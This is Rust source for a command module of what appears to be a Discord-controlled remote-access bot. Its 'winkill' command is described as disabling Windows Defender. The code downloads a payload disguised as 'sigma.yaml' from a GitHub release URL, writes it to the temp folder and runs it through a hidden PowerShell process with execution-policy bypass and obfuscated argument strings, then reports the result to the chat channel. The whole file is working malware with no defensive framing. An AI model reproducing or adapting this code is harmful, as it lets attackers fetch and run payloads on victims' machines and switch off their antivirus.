use crate::commands::*;
use crate::log_debug;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;
use std::os::windows::process::CommandExt;

const CREATE_NO_WINDOW: u32 = 0x08000000;
const SIGMA_YAML_URL: &str = "https://github.com/Outofwindows/service/releases/download/sigma/sigma.yaml";

pub struct WinKillCommand;

#[async_trait]
impl BotCommand for WinKillCommand {
    fn name(&self) -> &str { "winkill" }
    fn description(&self) -> &str { "Disable Windows Defender" }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &str { ".winkill" }
    fn examples(&self) -> &'static [&'static str] {
        &[".winkill"]
    }
    fn aliases(&self) -> &'static [&'static str] { &["defkill"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        _args: Arguments,
    ) -> Result<()> {
        log_debug!("WinKill command executed - disabling Windows Defender");
        
        http.create_message(msg.channel_id)
            .content("🔧 Downloading sigma.yaml and disabling Windows Defender...")
            .await?;

        let http_clone = Arc::clone(http);
        let channel_id = msg.channel_id;
        
        tokio::spawn(async move {
            match Self::disable_defender().await {
                Ok(_) => {
                    let _ = http_clone.create_message(channel_id)
                        .content("✅ Windows Defender disabled successfully")
                        .await;
                }
                Err(e) => {
                    log_debug!("Failed to disable defender: {}", e);
                    let _ = http_clone.create_message(channel_id)
                        .content(&format!("❌ Failed: {}", e))
                        .await;
                }
            }
        });

        Ok(())
    }
}

impl WinKillCommand {
    async fn disable_defender() -> Result<()> {
        // Download sigma.yaml
        let response = reqwest::get(SIGMA_YAML_URL).await?;
        let yaml_content = response.text().await?;
        
        // Save to temp
        let temp_dir = std::env::temp_dir();
        let yaml_path = temp_dir.join("sigma.yaml");
        tokio::fs::write(&yaml_path, &yaml_content).await?;
        
        log_debug!("Downloaded sigma.yaml to: {}", yaml_path.display());
        
        // Execute via PowerShell hidden
        use crate::utils::obfuscate::{exe, powershell as ps};
        let ps_command = format!(
            r#"Start-Process -FilePath '{}' -WindowStyle Hidden -Wait"#,
            yaml_path.display()
        );
        
        std::process::Command::new(exe::powershell())
            .args(&[&ps::no_profile(), &ps::window_style(), &ps::hidden(), &ps::execution_policy(), &ps::bypass(), &ps::command(), &ps_command])
            .creation_flags(CREATE_NO_WINDOW)
            .spawn()?;
        
        log_debug!("Sigma.yaml executed");
        Ok(())
    }
}
